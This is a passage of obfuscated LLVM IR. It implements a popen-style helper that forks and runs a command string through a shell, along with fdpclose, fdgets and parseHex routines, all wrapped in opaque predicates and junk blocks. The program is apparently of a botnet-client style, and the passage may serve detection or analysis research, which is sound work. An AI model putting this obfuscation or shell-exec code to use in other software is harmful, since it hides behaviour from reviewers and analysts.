  %201 = load i32, i32* %200, align 4
  %202 = call i32 @dup2(i32 %201, i32 0) #2
  %203 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %204 = load i32, i32* %203, align 4
  %205 = call i32 @close(i32 %204)
  br label %206

; <label>:206:                                    ; preds = %199, %195
  %207 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %208 = load i32, i32* %207, align 4
  %209 = call i32 @close(i32 %208)
  br label %210

; <label>:210:                                    ; preds = %206, %191
  %211 = load i8*, i8** %12, align 8
  %212 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.42, i32 0, i32 0), i8* %211, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:213:                                    ; preds = %originalBBpart220
  %214 = load i8*, i8** %13, align 8
  %215 = load i8, i8* %214, align 1
  %216 = zext i8 %215 to i32
  %217 = icmp eq i32 %216, 114
  br i1 %217, label %218, label %224

; <label>:218:                                    ; preds = %213
  %219 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %220 = load i32, i32* %219, align 4
  store i32 %220, i32* %14, align 4
  %221 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %222 = load i32, i32* %221, align 4
  %223 = call i32 @close(i32 %222)
  br label %246

; <label>:224:                                    ; preds = %213
  %225 = load i32, i32* @x.19
  %226 = load i32, i32* @y.20
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %224
  %233 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %234 = load i32, i32* %233, align 4
  store i32 %234, i32* %14, align 4
  %235 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %236 = load i32, i32* %235, align 4
  %237 = call i32 @close(i32 %236)
  %238 = load i32, i32* @x.19
  %239 = load i32, i32* @y.20
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %246

; <label>:246:                                    ; preds = %originalBBpart228, %218
  %247 = load i32, i32* @x.19
  %248 = load i32, i32* @y.20
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %246
  %255 = load i32, i32* %17, align 4
  %256 = load i32*, i32** @fdopen_pids, align 8
  %257 = load i32, i32* %14, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds i32, i32* %256, i64 %258
  store i32 %255, i32* %259, align 4
  %260 = load i32, i32* %14, align 4
  store i32 %260, i32* %11, align 4
  %261 = load i32, i32* @x.19
  %262 = load i32, i32* @y.20
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %269

; <label>:269:                                    ; preds = %originalBBpart232, %152, %originalBBpart216, %101, %originalBBpart28, %41
  %270 = load i32, i32* @x.19
  %271 = load i32, i32* @y.20
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %269
  %278 = load i32, i32* %11, align 4
  %279 = load i32, i32* @x.19
  %280 = load i32, i32* @y.20
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  ret i32 %278

originalBBalteredBB:                              ; preds = %originalBB, %2
  %287 = alloca i32, align 4
  %288 = alloca i8*, align 8
  %289 = alloca i8*, align 8
  %290 = alloca i32, align 4
  %291 = alloca [2 x i32], align 4
  %292 = alloca i32, align 4
  %293 = alloca i32, align 4
  store i8* %0, i8** %288, align 8
  store i8* %1, i8** %289, align 8
  %294 = load i8*, i8** %289, align 8
  %295 = load i8, i8* %294, align 1
  %296 = zext i8 %295 to i32
  %297 = icmp ne i32 %296, 114
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %42
  %298 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i32 0, i32 0
  %299 = call i32 @pipe(i32* %298) #2
  %300 = icmp slt i32 %299, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %62
  store i32 -1, i32* %11, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %79
  %301 = load i32*, i32** @fdopen_pids, align 8
  %302 = icmp eq i32* %301, null
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %111
  store i32 -1, i32* %11, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %134
  %303 = call i32 @vfork() #11
  store i32 %303, i32* %17, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %164
  %304 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %305 = load i32, i32* %304, align 4
  %306 = icmp ne i32 %305, 1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %224
  %307 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %308 = load i32, i32* %307, align 4
  store i32 %308, i32* %14, align 4
  %309 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %310 = load i32, i32* %309, align 4
  %311 = call i32 @close(i32 %310)
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %246
  %312 = load i32, i32* %17, align 4
  %313 = load i32*, i32** @fdopen_pids, align 8
  %314 = load i32, i32* %14, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds i32, i32* %313, i64 %315
  store i32 %312, i32* %316, align 4
  %317 = load i32, i32* %14, align 4
  store i32 %317, i32* %11, align 4
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %269
  %318 = load i32, i32* %11, align 4
  br label %originalBB34
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %174

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* @x.21
  %22 = load i32, i32* @y.22
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %20
  %29 = load i32, i32* %3, align 4
  %30 = call i32 @close(i32 %29)
  %31 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %32 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %33 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %34 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %35 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  %36 = load i32, i32* @x.21
  %37 = load i32, i32* @y.22
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %44

; <label>:44:                                     ; preds = %originalBBpart216, %originalBBpart2
  %45 = load i32, i32* @x.21
  %46 = load i32, i32* @y.22
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %44
  %53 = load i32*, i32** @fdopen_pids, align 8
  %54 = load i32, i32* %3, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i32, i32* %53, i64 %55
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @waitpid(i32 %57, i32* %7, i32 0)
  store i32 %58, i32* %8, align 4
  %59 = load i32, i32* @x.21
  %60 = load i32, i32* @y.22
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %67

; <label>:67:                                     ; preds = %originalBBpart24
  %68 = load i32, i32* @x.21
  %69 = load i32, i32* @y.22
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %67
  %76 = load i32, i32* %8, align 4
  %77 = icmp eq i32 %76, -1
  %78 = load i32, i32* @x.21
  %79 = load i32, i32* @y.22
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %77, label %86, label %106

; <label>:86:                                     ; preds = %originalBBpart28
  %87 = load i32, i32* @x.21
  %88 = load i32, i32* @y.22
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %86
  %95 = call i32* @__errno_location() #13
  %96 = load i32, i32* %95, align 4
  %97 = icmp eq i32 %96, 4
  %98 = load i32, i32* @x.21
  %99 = load i32, i32* @y.22
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %106

; <label>:106:                                    ; preds = %originalBBpart212, %originalBBpart28
  %107 = phi i1 [ false, %originalBBpart28 ], [ %97, %originalBBpart212 ]
  %108 = load i32, i32* @x.21
  %109 = load i32, i32* @y.22
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %106
  %116 = load i32, i32* @x.21
  %117 = load i32, i32* @y.22
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %107, label %44, label %124

; <label>:124:                                    ; preds = %originalBBpart216
  %125 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %126 = load i32*, i32** @fdopen_pids, align 8
  %127 = load i32, i32* %4, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i32, i32* %126, i64 %128
  store i32 0, i32* %129, align 4
  %130 = load i32, i32* %8, align 4
  %131 = icmp eq i32 %130, -1
  br i1 %131, label %132, label %133

; <label>:132:                                    ; preds = %124
  br label %156

; <label>:133:                                    ; preds = %124
  %134 = load i32, i32* @x.21
  %135 = load i32, i32* @y.22
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %133
  %142 = bitcast %struct.in_addr* %9 to i32*
  %143 = load i32, i32* %7, align 4
  store i32 %143, i32* %142, align 4
  %144 = bitcast %struct.in_addr* %9 to i32*
  %145 = load i32, i32* %144, align 4
  %146 = and i32 %145, 65280
  %147 = ashr i32 %146, 8
  %148 = load i32, i32* @x.21
  %149 = load i32, i32* @y.22
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart228, label %originalBB18alteredBB

originalBBpart228:                                ; preds = %originalBB18
  br label %156

; <label>:156:                                    ; preds = %originalBBpart228, %132
  %157 = phi i32 [ -1, %132 ], [ %147, %originalBBpart228 ]
  %158 = load i32, i32* @x.21
  %159 = load i32, i32* @y.22
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %156
  store i32 %157, i32* %2, align 4
  %166 = load i32, i32* @x.21
  %167 = load i32, i32* @y.22
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %174

; <label>:174:                                    ; preds = %originalBBpart232, %19
  %175 = load i32, i32* %2, align 4
  ret i32 %175

originalBBalteredBB:                              ; preds = %originalBB, %20
  %176 = load i32, i32* %3, align 4
  %177 = call i32 @close(i32 %176)
  %178 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %179 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %180 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %181 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %182 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %44
  %183 = load i32*, i32** @fdopen_pids, align 8
  %184 = load i32, i32* %3, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds i32, i32* %183, i64 %185
  %187 = load i32, i32* %186, align 4
  %188 = call i32 @waitpid(i32 %187, i32* %7, i32 0)
  store i32 %188, i32* %8, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %67
  %189 = load i32, i32* %8, align 4
  %190 = icmp eq i32 %189, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %86
  %191 = call i32* @__errno_location() #13
  %192 = load i32, i32* %191, align 4
  %193 = icmp eq i32 %192, 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %106
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %133
  %194 = bitcast %struct.in_addr* %9 to i32*
  %195 = load i32, i32* %7, align 4
  store i32 %195, i32* %194, align 4
  %196 = bitcast %struct.in_addr* %9 to i32*
  %197 = load i32, i32* %196, align 4
  %_ = shl i32 %197, 65280
  %_19 = shl i32 %197, 65280
  %_20 = sub i32 0, %197
  %gen = add i32 %_20, 65280
  %_21 = shl i32 %197, 65280
  %_22 = sub i32 %197, 65280
  %gen23 = mul i32 %_22, 65280
  %_24 = sub i32 %197, 65280
  %gen25 = mul i32 %_24, 65280
  %198 = and i32 %197, 65280
  %_26 = shl i32 %198, 8
  %199 = ashr i32 %198, 8
  br label %originalBB18

originalBB30alteredBB:                            ; preds = %originalBB30, %156
  store i32 %157, i32* %2, align 4
  br label %originalBB30
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.23
  %5 = load i32, i32* @y.24
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  store i32 1, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %17 = load i32, i32* @x.23
  %18 = load i32, i32* @y.24
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %originalBBpart225, %originalBBpart2
  %26 = load i32, i32* @x.23
  %27 = load i32, i32* @y.24
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  %34 = load i32, i32* %15, align 4
  %35 = icmp eq i32 %34, 1
  %36 = load i32, i32* @x.23
  %37 = load i32, i32* @y.24
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %35, label %44, label %73

; <label>:44:                                     ; preds = %originalBBpart24
  %45 = load i32, i32* %16, align 4
  %46 = load i32, i32* %13, align 4
  %47 = icmp slt i32 %45, %46
  br i1 %47, label %48, label %73

; <label>:48:                                     ; preds = %44
  %49 = load i32, i32* @x.23
  %50 = load i32, i32* @y.24
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %48
  %57 = load i8*, i8** %12, align 8
  %58 = load i32, i32* %16, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = getelementptr inbounds i8, i8* %60, i64 -1
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp ne i32 %63, 10
  %65 = load i32, i32* @x.23
  %66 = load i32, i32* @y.24
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %73

; <label>:73:                                     ; preds = %originalBBpart28, %44, %originalBBpart24
  %74 = phi i1 [ false, %44 ], [ false, %originalBBpart24 ], [ %64, %originalBBpart28 ]
  %75 = load i32, i32* @x.23
  %76 = load i32, i32* @y.24
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %73
  %83 = load i32, i32* @x.23
  %84 = load i32, i32* @y.24
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %74, label %91, label %117

; <label>:91:                                     ; preds = %originalBBpart212
  %92 = load i32, i32* @x.23
  %93 = load i32, i32* @y.24
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %91
  %100 = load i32, i32* %14, align 4
  %101 = load i8*, i8** %12, align 8
  %102 = load i32, i32* %16, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i8, i8* %101, i64 %103
  %105 = call i64 @read(i32 %100, i8* %104, i64 1)
  %106 = trunc i64 %105 to i32
  store i32 %106, i32* %15, align 4
  %107 = load i32, i32* %16, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %16, align 4
  %109 = load i32, i32* @x.23
  %110 = load i32, i32* @y.24
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart225, label %originalBB14alteredBB

originalBBpart225:                                ; preds = %originalBB14
  br label %25

; <label>:117:                                    ; preds = %originalBBpart212
  %118 = load i32, i32* @x.23
  %119 = load i32, i32* @y.24
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %117
  %126 = load i32, i32* %15, align 4
  %127 = icmp eq i32 %126, 0
  %128 = load i32, i32* @x.23
  %129 = load i32, i32* @y.24
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br i1 %127, label %136, label %137

; <label>:136:                                    ; preds = %originalBBpart229
  br label %139

; <label>:137:                                    ; preds = %originalBBpart229
  %138 = load i8*, i8** %12, align 8
  br label %139

; <label>:139:                                    ; preds = %137, %136
  %140 = phi i8* [ null, %136 ], [ %138, %137 ]
  ret i8* %140

originalBBalteredBB:                              ; preds = %originalBB, %3
  %141 = alloca i8*, align 8
  %142 = alloca i32, align 4
  %143 = alloca i32, align 4
  %144 = alloca i32, align 4
  %145 = alloca i32, align 4
  store i8* %0, i8** %141, align 8
  store i32 %1, i32* %142, align 4
  store i32 %2, i32* %143, align 4
  store i32 1, i32* %144, align 4
  store i32 0, i32* %145, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  %146 = load i32, i32* %15, align 4
  %147 = icmp eq i32 %146, 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %48
  %148 = load i8*, i8** %12, align 8
  %149 = load i32, i32* %16, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds i8, i8* %148, i64 %150
  %152 = getelementptr inbounds i8, i8* %151, i64 -1
  %153 = load i8, i8* %152, align 1
  %154 = zext i8 %153 to i32
  %155 = icmp ne i32 %154, 10
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %73
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %91
  %156 = load i32, i32* %14, align 4
  %157 = load i8*, i8** %12, align 8
  %158 = load i32, i32* %16, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds i8, i8* %157, i64 %159
  %161 = call i64 @read(i32 %156, i8* %160, i64 1)
  %162 = trunc i64 %161 to i32
  store i32 %162, i32* %15, align 4
  %163 = load i32, i32* %16, align 4
  %_ = sub i32 0, %163
  %gen = add i32 %_, 1
  %_15 = shl i32 %163, 1
  %_16 = sub i32 0, %163
  %gen17 = add i32 %_16, 1
  %_18 = shl i32 %163, 1
  %_19 = sub i32 %163, 1
  %gen20 = mul i32 %_19, 1
  %_21 = shl i32 %163, 1
  %_22 = shl i32 %163, 1
  %_23 = shl i32 %163, 1
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %16, align 4
  br label %originalBB14

originalBB27alteredBB:                            ; preds = %originalBB27, %117
  %165 = load i32, i32* %15, align 4
  %166 = icmp eq i32 %165, 0
  br label %originalBB27
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %originalBBpart218, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %28

; <label>:9:                                      ; preds = %4
  %10 = load i32, i32* @x.25
  %11 = load i32, i32* @y.26
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %9
  %18 = load i64, i64* %3, align 8
  %19 = icmp sge i64 %18, 0
  %20 = load i32, i32* @x.25
  %21 = load i32, i32* @y.26
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %28

; <label>:28:                                     ; preds = %originalBBpart2, %4
  %29 = phi i1 [ false, %4 ], [ %19, %originalBBpart2 ]
  %30 = load i32, i32* @x.25
  %31 = load i32, i32* @y.26
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %28
  %38 = load i32, i32* @x.25
  %39 = load i32, i32* @y.26
